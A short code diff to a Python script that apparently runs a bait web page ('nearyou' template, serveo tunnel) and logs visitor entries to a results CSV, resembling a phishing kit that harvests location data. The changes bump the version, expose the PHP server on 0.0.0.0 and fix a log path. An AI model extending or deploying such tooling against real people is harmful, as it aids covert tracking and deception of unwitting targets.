@@ -28,7 +28,7 @@ result = 'template/nearyou/php/result.txt'
 info = 'template/nearyou/php/info.txt'
 site = 'nearyou'
 row = []
-version = '1.1.9'
+version = '1.2.0'
 
 def banner():
 	os.system('clear')
@@ -120,10 +120,10 @@ def serveo():
 def server():
 	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
 	with open('logs/php.log', 'w') as phplog:
-		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', 'template/'], stdout=phplog, stderr=phplog)
+		subp.Popen(['php', '-S', '0.0.0.0:8080', '-t', 'template/'], stdout=phplog, stderr=phplog)
 		time.sleep(3)
 	try:
-		php_rqst = requests.get('http://127.0.0.1:8080/nearyou/index.html')
+		php_rqst = requests.get('http://0.0.0.0:8080/nearyou/index.html')
 		php_sc = php_rqst.status_code
 		if php_sc == 200:
 			print(C + '[' + G + ' Success ' + C + ']' + W)
@@ -287,7 +287,7 @@ def csvout():
 	with open('db/results.csv', 'a') as csvfile:
 		writer = csv.writer(csvfile)
 		writer.writerow(row)
-	print(G + '[+]' + C + ' New Entry Added in Database.: ' + W + os.getcwd() + '/results.csv')
+	print(G + '[+]' + C + ' New Entry Added in Database.: ' + W + os.getcwd() + '/db/results.csv')
 
 def clear():
 	global result
